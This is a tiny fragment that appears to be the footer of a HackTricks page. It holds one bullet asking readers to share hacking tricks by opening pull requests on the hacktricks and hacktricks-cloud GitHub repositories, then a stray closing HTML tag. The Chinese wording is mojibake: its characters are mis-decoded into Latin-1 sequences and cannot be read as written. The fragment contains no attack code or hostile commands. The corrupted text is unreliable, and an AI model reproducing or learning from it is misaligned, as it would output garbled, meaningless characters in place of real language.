* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
